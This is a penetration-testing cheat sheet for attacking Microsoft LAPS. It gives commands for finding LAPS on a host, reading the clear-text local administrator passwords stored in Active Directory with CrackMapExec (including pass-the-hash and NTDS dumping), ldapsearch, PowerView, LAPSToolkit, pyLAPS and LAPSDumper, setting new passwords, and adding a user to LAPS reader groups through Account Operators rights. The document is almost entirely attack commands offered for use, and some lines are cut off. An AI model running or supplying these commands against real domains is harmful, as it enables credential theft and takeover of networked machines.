# ENUMERATION

#### dir "C:\Program\LAPS\CSE"

#### Get-ChildItem 'c:\program files\LAPS\CSE\Admpwd.dll'

#### Get-FileHash 'c:\program files\LAPS\CSE\Admpwd.dll'

#### Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'

### If admpwd.dll exists, then enumeration is successful.

# LAPS PASSWORD EXTRACTION

### The "ms-mcs-AdmPwd" a "confidential" computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users

#### 1) Get-Command *Admpwd*

#### 2) Find-AdmPwdExtendedRights -Identity *

#### 3) net groups "GROUP_THAT_HAS_ACCESS_TO_LAPS"

#### 4) Get-AdmPwdPassword -ComputerName PC_THAT_HAS_LAPS_ENABLED

## Possible tools: LAPSToolkit, Crackmapexec, ldapsearch

### If a user has access to view the LAPS password, we can use crackmapexec or ldapsearch to dump password:

#### 1) CrackMapExec

 - crackmapexec smb IP_ADDRESS -u USER -p PASSWORD --laps --ntds

 - crackmapexec smb 10.10.10.10 -u 'user' -H '8846f7eaee8fb117ad06bdd830b7586c' --laps

#### 2) ldapsearch

 - ldapsearch -h IP_ADDRESS -b 'DC=DOMAIN,DC=LOCAL' -x -D USER@DOMAIN.LOCAL -w 'PASSWORD' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

#### 3) LAPSToolkit

 - Get-LAPSComputers

 - Find-LAPSDelegatedGroups

 - Find-AdmPwdExtendedRights

#### 4) adsisearcher (native binary on Windows 8+)

 - ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))"

 - ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE

#### 5) Powerview

 - Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwd


#### 6) pyLAPS (Linux)

### Read the password of all computers

 - ./pyLAPS.py --action get -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip IP_ADDRESS

### Write a random password to a specific computer

 - ./pyLAPS.py --action set --computer 'PC01$' -u 'Administrator' -d 'LAB.local'

#### 7) LAPSDumper (Linux)

 - python laps.py -u 'user' -p 'password' -d 'domain.local'

 - python laps.py -u 'user' -p 'e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c' -d 'domain.local

# GRANT LAPS ACCESS

### The members of the group "Account Operator" can add and modify all the non admin users and groups. Since LAPS ADM and LAPS READ are considered as non admin groups, it's possible to add an user to them, and read the LAPS admin password

 - Add-DomainGroupMember -Identity 'LAPS ADM' -Members 'user1' -Credential $cred -Domain

 - Add-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -Domain
